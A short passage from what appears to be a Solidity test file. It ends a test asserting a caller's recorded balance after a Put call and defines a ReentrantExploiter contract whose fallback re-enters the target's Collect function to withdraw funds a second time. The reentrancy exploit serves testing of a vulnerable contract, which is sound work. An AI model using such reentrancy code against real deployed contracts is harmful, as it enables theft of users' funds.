        uint256 accBal = c.Acc(address(exploiter)).balance;
        // After a single Put call, the caller's recorded balance must be at least the value they sent.
        assertTrue(accBal >= amount1);
    }
}

contract ReentrantExploiter {
    C target;
    uint256 callCount;
    constructor(C _target) payable {
        target = _target;
    }
    fallback() external payable {
        if (callCount == 0 && address(this).balance >= 0.1 ether) {
            callCount++;
            target.Collect(0.1 ether);
        }
    }
}

